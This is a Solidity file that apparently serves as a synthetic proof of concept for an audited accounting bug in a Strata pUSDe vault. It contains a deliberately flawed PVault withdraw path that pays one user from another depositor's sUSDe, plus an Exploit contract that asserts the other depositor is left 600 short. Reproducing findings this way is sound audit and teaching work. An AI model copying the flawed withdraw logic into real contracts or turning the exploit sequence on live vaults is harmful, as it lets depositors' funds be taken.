// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Strata pUSDe — yield-phase withdraw does not redeem supported vaults
    (Cyfrin, June 2025). The supported-vault variant of the sUSDe path.
    SYNTHETIC, cheatcode-free. No time warp.
    A user who deposited 600 through a supported vault withdraws 600.
    The yield-phase path unwraps sUSDe, which holds another depositor's
    1000, and leaves the supported-vault shares locked. That depositor's
    full 1000 exit reverts. They are 600 short of liquid sUSDe.
    The fixed path redeems the supported vault and does not touch sUSDe. */

contract USDe {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SUSDe {
    USDe public usde;
    mapping(address => uint256) public balanceOf;

    constructor(USDe usde_) {
        usde = usde_;
    }

    function credit(uint256 amount) external {
        balanceOf[msg.sender] += amount;
    }

    function withdraw(uint256 amount, address to) external {
        balanceOf[msg.sender] -= amount;
        usde.transfer(to, amount);
    }
}

contract SupportedVault {
    USDe public usde;
    mapping(address => uint256) public balanceOf;

    constructor(USDe usde_) {
        usde = usde_;
    }

    function credit(address user, uint256 amount) external {
        balanceOf[user] += amount;
    }

    function pull(address user, uint256 amount) external {
        balanceOf[user] -= amount;
        balanceOf[msg.sender] += amount;
    }

    function redeem(uint256 amount, address to) external {
        balanceOf[msg.sender] -= amount;
        usde.transfer(to, amount);
    }
}

contract PVault {
    USDe public usde;
    SUSDe public susde;
    SupportedVault public supported;
    bool public yieldPhase;
    uint256 public pulledFromSusde;
    mapping(address => uint256) public shares;

    constructor(USDe usde_, SUSDe susde_, SupportedVault supported_) {
        usde = usde_;
        susde = susde_;
        supported = supported_;
    }

    function depositBase(address user, uint256 amount) external {
        shares[user] += amount;
    }

    function startYieldPhase() external {
        uint256 bal = usde.balanceOf(address(this));
        usde.transfer(address(susde), bal);
        susde.credit(bal);
        yieldPhase = true;
    }

    function depositSupported(address user, uint256 amount) external {
        supported.pull(user, amount);
        shares[user] += amount;
    }

    function withdraw(address user, uint256 assets) public virtual returns (uint256) {
        require(yieldPhase, "phase");
        uint256 loose = usde.balanceOf(address(this));
        if (loose < assets) {
            uint256 need = assets - loose;
            // @> VULN: yield-phase withdraw unwraps sUSDe and never redeems supported-vault shares.
            pulledFromSusde = need;
            susde.withdraw(need, address(this));
        }
        usde.transfer(user, assets);
        shares[user] -= assets;
        return assets;
    }

    function tryWithdraw(address user, uint256 assets) external returns (bool ok) {
        (ok,) = address(this).call(abi.encodeWithSelector(this.withdraw.selector, user, assets));
    }
}

contract Exploit {
    USDe public usde; // nonce 1
    SUSDe public susde; // nonce 2
    SupportedVault public supported; // nonce 3
    PVault public p; // nonce 4
    address public user1;

    constructor() {
        usde = new USDe();
        susde = new SUSDe(usde);
        supported = new SupportedVault(usde);
        p = new PVault(usde, susde, supported);
        user1 = address(0xA11CE);
    }

    function run() external {
        usde.mint(address(p), 1000);
        p.depositBase(user1, 1000);
        p.startYieldPhase();
        usde.mint(address(supported), 600);
        supported.credit(address(this), 600);
        p.depositSupported(address(this), 600);
        uint256 got = p.withdraw(address(this), 600);
        bool full = p.tryWithdraw(user1, 1000);
        require(got == 600, "extracted 600");
        require(usde.balanceOf(address(this)) == 600, "attacker holds 600");
        require(susde.balanceOf(address(p)) == 400, "sUSDe depositor is 600 short");
        require(supported.balanceOf(address(p)) == 600, "supported shares stayed locked");
        require(full == false, "user1 full exit reverted");
        require(p.pulledFromSusde() == 600, "the 600 came from sUSDe");
    }
}
